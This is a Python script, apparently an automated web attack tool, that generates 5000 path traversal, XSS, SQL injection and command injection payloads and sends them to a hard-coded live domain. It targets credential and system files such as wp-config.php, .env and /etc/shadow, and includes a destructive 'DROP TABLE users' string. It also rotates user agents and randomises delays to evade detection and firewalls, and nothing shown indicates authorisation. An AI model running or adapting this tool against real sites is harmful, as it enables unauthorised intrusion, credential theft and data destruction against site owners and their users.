#!/usr/bin/env python3
"""
Improved Comprehensive Payload Tester - 5000 Variations
Enhanced success detection to avoid false positives
"""

import requests
import urllib.parse
import base64
import html
import json
import time
import random
import string
from typing import List, Dict, Any
import re
from datetime import datetime
import hashlib

class ImprovedPayloadTester:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.total_tests = 0
        self.successful_payloads = []
        self.blocked_count = 0
        self.error_count = 0
        self.test_log = []
        self.max_tests = 5000
        
        # Rotate User Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
    def get_random_headers(self):
        """Generate random headers to avoid detection"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'th-TH,th;q=0.8,en-US;q=0.5,en;q=0.3']),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def generate_comprehensive_payloads(self) -> List[Dict[str, str]]:
        """Generate comprehensive payloads with types"""
        payloads = []
        
        # LFI Payloads
        lfi_files = [
            'wp-config.php', 'config.php', '.env', 'database.php',
            'etc/passwd', 'etc/shadow', 'etc/hosts', 'etc/group',
            'var/log/apache2/access.log', 'var/log/nginx/access.log',
            'proc/self/environ', 'proc/version', 'proc/cmdline',
            'home/user/.bash_history', 'root/.bash_history'
        ]
        
        lfi_patterns = [
            '../', '..\\', '..../', '....\\',
            '..;/', '..%2f', '..%5c', '..%252f', '..%255c',
            '%2e%2e/', '%2e%2e\\', '%252e%252e/', '%252e%252e\\',
            '..%c0%af', '..%c1%9c', '%c0%2e%c0%2e/', '0x2e0x2e/'
        ]
        
        # Generate LFI combinations
        for file in lfi_files:
            for pattern in lfi_patterns:
                for depth in [3, 5, 7, 10]:
                    base_payload = pattern * depth + file
                    payloads.append({
                        'payload': base_payload,
                        'type': 'LFI',
                        'encoded': False
                    })
                    
                    # URL encoded version
                    payloads.append({
                        'payload': urllib.parse.quote(base_payload),
                        'type': 'LFI',
                        'encoded': True
                    })
                    
                    # Double encoded version
                    payloads.append({
                        'payload': urllib.parse.quote(urllib.parse.quote(base_payload)),
                        'type': 'LFI',
                        'encoded': True
                    })
                    
                    # Null byte variations
                    payloads.append({
                        'payload': base_payload + '%00',
                        'type': 'LFI',
                        'encoded': True
                    })
        
        # XSS Payloads
        xss_basic = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "\";alert('XSS');//"
        ]
        
        # Generate XSS variations
        for xss in xss_basic:
            payloads.append({
                'payload': xss,
                'type': 'XSS',
                'encoded': False
            })
            
            # URL encoded
            payloads.append({
                'payload': urllib.parse.quote(xss),
                'type': 'XSS',
                'encoded': True
            })
            
            # HTML encoded
            payloads.append({
                'payload': html.escape(xss),
                'type': 'XSS',
                'encoded': True
            })
            
            # Case variations
            payloads.append({
                'payload': xss.upper(),
                'type': 'XSS',
                'encoded': False
            })
        
        # SQL Injection Payloads
        sqli_basic = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--"
        ]
        
        for sqli in sqli_basic:
            payloads.append({
                'payload': sqli,
                'type': 'SQLi',
                'encoded': False
            })
            
            # URL encoded
            payloads.append({
                'payload': urllib.parse.quote(sqli),
                'type': 'SQLi',
                'encoded': True
            })
        
        # Command Injection Payloads
        cmdi_basic = [
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
            "; id",
            "| id",
            "&& id",
            "`ls -la`",
            "$(ls -la)",
            "`whoami`",
            "$(whoami)"
        ]
        
        for cmdi in cmdi_basic:
            payloads.append({
                'payload': cmdi,
                'type': 'CMDi',
                'encoded': False
            })
            
            # URL encoded
            payloads.append({
                'payload': urllib.parse.quote(cmdi),
                'type': 'CMDi',
                'encoded': True
            })
        
        # Shuffle and limit to 5000
        random.shuffle(payloads)
        
        # Ensure we have exactly 5000 payloads
        while len(payloads) < self.max_tests:
            payloads.extend(payloads[:min(len(payloads), self.max_tests - len(payloads))])
        
        return payloads[:self.max_tests]
    
    def check_success(self, payload_info: Dict[str, str], response: requests.Response) -> bool:
        """Enhanced success detection with stricter criteria"""
        payload = payload_info['payload']
        payload_type = payload_info['type']
        
        # Must be 200 status code
        if response.status_code != 200:
            return False
        
        # Check for blocking indicators first
        blocking_indicators = [
            'cloudflare', 'blocked', 'forbidden', '403', 'access denied',
            'security', 'firewall', 'waf', 'protection', 'ray id',
            'sorry, you have been blocked', 'attention required'
        ]
        
        response_lower = response.text.lower()
        if any(indicator in response_lower for indicator in blocking_indicators):
            return False
        
        # Type-specific success indicators
        if payload_type == 'LFI':
            # Strong indicators of successful file inclusion
            lfi_indicators = [
                # WordPress config indicators
                'DB_PASSWORD', 'DB_HOST', 'DB_NAME', 'DB_USER',
                'define(\'DB_', 'define("DB_',
                'ABSPATH', 'WP_DEBUG', 'table_prefix',
                
                # Linux system files
                'root:x:0:0', 'daemon:x:1:1', 'bin:x:2:2',
                'www-data:x:', 'mysql:x:', 'nobody:x:',
                '/bin/bash', '/bin/sh', '/sbin/nologin',
                
                # Environment variables
                'PATH=', 'HOME=', 'USER=', 'SHELL=',
                
                # Log file indicators
                'GET /', 'POST /', 'HTTP/1.1', 'Mozilla/',
                
                # PHP configuration
                '<?php', 'php.ini', 'extension=',
            ]
            
            # Need at least 2 strong indicators for LFI
            found_indicators = sum(1 for indicator in lfi_indicators if indicator in response.text)
            return found_indicators >= 2
            
        elif payload_type == 'XSS':
            # XSS success indicators - payload must be reflected unescaped
            decoded_payload = urllib.parse.unquote(payload) if payload_info['encoded'] else payload
            
            # Check if payload is reflected without proper escaping
            if decoded_payload in response.text:
                # Additional checks for XSS contexts
                xss_contexts = [
                    '<script', 'javascript:', 'onerror=', 'onload=',
                    'onfocus=', 'onmouseover=', 'onclick=', 'alert(',
                    'document.', 'window.', 'eval('
                ]
                
                return any(context in response.text for context in xss_contexts)
            return False
            
        elif payload_type == 'SQLi':
            # SQL injection indicators
            sqli_indicators = [
                # MySQL errors
                'mysql_fetch', 'mysql_num_rows', 'mysql_error',
                'Warning: mysql', 'MySQL Error', 'valid MySQL result',
                
                # PostgreSQL errors
                'PostgreSQL', 'pg_query', 'pg_exec',
                
                # MSSQL errors
                'Microsoft OLE DB', 'ODBC SQL', 'Microsoft JET Database',
                
                # Oracle errors
                'ORA-', 'Oracle Error',
                
                # Generic SQL errors
                'SQL syntax', 'syntax error', 'database error',
                'Table doesn\'t exist', 'Column not found'
            ]
            
            return any(indicator in response.text for indicator in sqli_indicators)
            
        elif payload_type == 'CMDi':
            # Command injection indicators
            cmdi_indicators = [
                # Command output patterns
                'uid=', 'gid=', 'groups=',  # id command
                'total ', 'drwx', '-rw-',   # ls command
                'root:x:0:0',               # /etc/passwd
                '/bin/bash', '/bin/sh',     # shell paths
                
                # Directory listings
                'drwxr-xr-x', '-rwxr-xr-x',
                
                # System information
                'Linux', 'GNU/', 'kernel'
            ]
            
            return any(indicator in response.text for indicator in cmdi_indicators)
        
        return False
    
    def test_payload(self, endpoint: str, param: str, payload_info: Dict[str, str], method: str = 'GET') -> Dict[str, Any]:
        """Test a single payload with improved detection"""
        self.total_tests += 1
        
        headers = self.get_random_headers()
        url = f"{self.target_url}/{endpoint}"
        payload = payload_info['payload']
        
        result = {
            'test_number': self.total_tests,
            'timestamp': datetime.now().isoformat(),
            'url': url,
            'method': method,
            'parameter': param,
            'payload': payload,
            'payload_type': payload_info['type'],
            'payload_encoded': payload_info['encoded'],
            'payload_hash': hashlib.md5(payload.encode()).hexdigest()[:8],
            'status_code': None,
            'response_length': 0,
            'response_time': 0,
            'blocked': False,
            'success': False,
            'error': None,
            'response_preview': ''
        }
        
        try:
            start_time = time.time()
            
            if method.upper() == 'POST':
                data = {param: payload}
                response = self.session.post(url, data=data, headers=headers, timeout=self.timeout)
            else:
                params = {param: payload}
                response = self.session.get(url, params=params, headers=headers, timeout=self.timeout)
            
            end_time = time.time()
            result['response_time'] = round(end_time - start_time, 3)
            result['status_code'] = response.status_code
            result['response_length'] = len(response.text)
            result['response_preview'] = response.text[:300]
            
            # Check for blocking
            blocking_indicators = [
                'cloudflare', 'blocked', 'forbidden', '403', 'access denied',
                'security', 'firewall', 'waf', 'protection', 'ray id'
            ]
            
            response_lower = response.text.lower()
            result['blocked'] = any(indicator in response_lower for indicator in blocking_indicators)
            
            # Enhanced success detection
            if self.check_success(payload_info, response):
                result['success'] = True
                self.successful_payloads.append(result)
                print(f"\n🎯 POTENTIAL SUCCESS FOUND! Test #{self.total_tests}")
                print(f"Payload Type: {payload_info['type']}")
                print(f"Payload: {payload[:100]}...")
                print(f"Endpoint: {endpoint}, Parameter: {param}")
                print(f"Status: {response.status_code}, Length: {len(response.text)}")
                print(f"Response preview: {response.text[:200]}...")
                print("-" * 60)
            
            if result['blocked']:
                self.blocked_count += 1
                
        except requests.exceptions.RequestException as e:
            result['error'] = str(e)
            self.error_count += 1
        
        # Log the test
        self.test_log.append(result)
        
        # Print progress every 50 tests
        if self.total_tests % 50 == 0:
            print(f"Progress: {self.total_tests}/{self.max_tests} tests completed")
            print(f"Successful: {len(self.successful_payloads)}, Blocked: {self.blocked_count}, Errors: {self.error_count}")
            print("-" * 60)
        
        # Random delay
        time.sleep(random.uniform(0.2, 0.8))
        
        return result
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run comprehensive testing with 5000 payload variations"""
        print("🚀 Starting Improved Comprehensive Payload Testing - 5000 Variations")
        print("=" * 80)
        print(f"Target: {self.target_url}")
        print(f"Max Tests: {self.max_tests}")
        print(f"Start Time: {datetime.now()}")
        print("=" * 80)
        
        # Generate payloads
        print("📝 Generating 5000 comprehensive payloads...")
        all_payloads = self.generate_comprehensive_payloads()
        
        print(f"📊 Generated {len(all_payloads)} payloads")
        
        # Count by type
        type_counts = {}
        for p in all_payloads:
            type_counts[p['type']] = type_counts.get(p['type'], 0) + 1
        
        for ptype, count in type_counts.items():
            print(f"   {ptype}: {count} payloads")
        
        print("🔥 Starting tests...")
        print()
        
        # Test endpoints and parameters
        test_endpoints = [
            ('index.php', 'page'),
            ('index.php', 'file'),
            ('index.php', 'include'),
            ('index.php', 'path'),
            ('index.php', 'id'),
            ('search.php', 'q'),
            ('search.php', 'query'),
            ('login.php', 'username'),
            ('login.php', 'password'),
            ('admin.php', 'id'),
            ('view.php', 'id'),
            ('show.php', 'id'),
            ('user.php', 'id'),
            ('profile.php', 'user'),
            ('download.php', 'file'),
            ('contact.php', 'message'),
            ('comment.php', 'comment'),
            ('news.php', 'id'),
            ('article.php', 'id'),
            ('test.php', 'input')
        ]
        
        # Test each payload
        for i, payload_info in enumerate(all_payloads):
            if self.total_tests >= self.max_tests:
                break
                
            # Select random endpoint and parameter
            endpoint, param = random.choice(test_endpoints)
            method = random.choice(['GET', 'POST'])
            
            # Test the payload
            result = self.test_payload(endpoint, param, payload_info, method)
            
            # If we found any successful payload, we can continue testing
            # Only stop if we want to analyze successful ones immediately
            # For now, let's continue testing to find all possible vulnerabilities
        
        # Generate final report
        return self.generate_final_report()
    
    def generate_final_report(self) -> Dict[str, Any]:
        """Generate comprehensive final report"""
        end_time = datetime.now()
        
        report = {
            'summary': {
                'total_tests_conducted': self.total_tests,
                'max_tests_planned': self.max_tests,
                'tests_completed': self.total_tests >= self.max_tests,
                'successful_payloads_found': len(self.successful_payloads),
                'blocked_requests': self.blocked_count,
                'error_requests': self.error_count,
                'success_rate': (len(self.successful_payloads) / self.total_tests * 100) if self.total_tests > 0 else 0,
                'block_rate': (self.blocked_count / self.total_tests * 100) if self.total_tests > 0 else 0,
                'end_time': end_time.isoformat()
            },
            'successful_payloads': self.successful_payloads,
            'test_log': self.test_log
        }
        
        return report
    
    def save_results(self, report: Dict[str, Any], filename: str = None):
        """Save test results to file"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"improved_payload_results_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return filename
    
    def print_final_summary(self, report: Dict[str, Any]):
        """Print final test summary"""
        print("\n" + "=" * 80)
        print("🏁 IMPROVED COMPREHENSIVE PAYLOAD TESTING COMPLETED")
        print("=" * 80)
        
        summary = report['summary']
        
        print(f"📊 FINAL STATISTICS:")
        print(f"   Total Tests Conducted: {summary['total_tests_conducted']}")
        print(f"   Tests Planned: {summary['max_tests_planned']}")
        print(f"   Tests Completed: {'✅ YES' if summary['tests_completed'] else '❌ NO'}")
        print(f"   Successful Payloads: {summary['successful_payloads_found']}")
        print(f"   Blocked Requests: {summary['blocked_requests']}")
        print(f"   Error Requests: {summary['error_requests']}")
        print(f"   Success Rate: {summary['success_rate']:.2f}%")
        print(f"   Block Rate: {summary['block_rate']:.2f}%")
        
        if summary['successful_payloads_found'] > 0:
            print(f"\n🎯 SUCCESSFUL PAYLOADS FOUND:")
            for i, payload_result in enumerate(report['successful_payloads'], 1):
                print(f"   {i}. Test #{payload_result['test_number']}")
                print(f"      Type: {payload_result['payload_type']}")
                print(f"      Endpoint: {payload_result['url']}")
                print(f"      Parameter: {payload_result['parameter']}")
                print(f"      Payload: {payload_result['payload'][:100]}...")
                print(f"      Status: {payload_result['status_code']}")
                print(f"      Response Length: {payload_result['response_length']} bytes")
                print(f"      Response Time: {payload_result['response_time']}s")
                print()
        else:
            print(f"\n❌ NO SUCCESSFUL PAYLOADS FOUND")
            print(f"   The target website appears to have strong security protection.")
            print(f"   All {summary['total_tests_conducted']} payload variations were blocked or failed.")
        
        print("=" * 80)

def main():
    target_url = "https://pakyok77.link"
    
    print("🔥 IMPROVED COMPREHENSIVE PAYLOAD TESTER")
    print("Testing 5000 payload variations with enhanced detection")
    print("Will continue until all 5000 tests are completed")
    print("Enhanced success detection to avoid false positives")
    print()
    
    tester = ImprovedPayloadTester(target_url)
    
    try:
        # Run comprehensive testing
        report = tester.run_comprehensive_test()
        
        # Save results
        filename = tester.save_results(report)
        print(f"\n💾 Results saved to: {filename}")
        
        # Print final summary
        tester.print_final_summary(report)
        
        # Additional evidence file
        evidence_filename = f"improved_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(evidence_filename, 'w', encoding='utf-8') as f:
            f.write("IMPROVED PAYLOAD TESTING EVIDENCE\n")
            f.write("=" * 50 + "\n")
            f.write(f"Target: {target_url}\n")
            f.write(f"Total Tests: {tester.total_tests}\n")
            f.write(f"Successful: {len(tester.successful_payloads)}\n")
            f.write(f"Blocked: {tester.blocked_count}\n")
            f.write(f"Errors: {tester.error_count}\n\n")
            
            if tester.successful_payloads:
                f.write("SUCCESSFUL PAYLOADS:\n")
                f.write("-" * 30 + "\n")
                for i, success in enumerate(tester.successful_payloads, 1):
                    f.write(f"{i}. Type: {success['payload_type']}\n")
                    f.write(f"   Payload: {success['payload']}\n")
                    f.write(f"   URL: {success['url']}?{success['parameter']}=...\n")
                    f.write(f"   Status: {success['status_code']}\n")
                    f.write(f"   Response Length: {success['response_length']}\n\n")
            
            f.write("PAYLOAD SAMPLES (First 100):\n")
            f.write("-" * 30 + "\n")
            for i, log_entry in enumerate(tester.test_log[:100], 1):
                f.write(f"{i}. [{log_entry['payload_type']}] {log_entry['payload'][:80]}...\n")
                f.write(f"   Status: {log_entry['status_code']}, Blocked: {log_entry['blocked']}, Success: {log_entry['success']}\n\n")
        
        print(f"📋 Evidence file saved to: {evidence_filename}")
        
    except KeyboardInterrupt:
        print(f"\n⚠️  Testing interrupted by user at test #{tester.total_tests}")
        print(f"Partial results available - {len(tester.successful_payloads)} successful payloads found")
    except Exception as e:
        print(f"\n❌ Error during testing: {e}")
        print(f"Tests completed before error: {tester.total_tests}")

if __name__ == "__main__":
    main()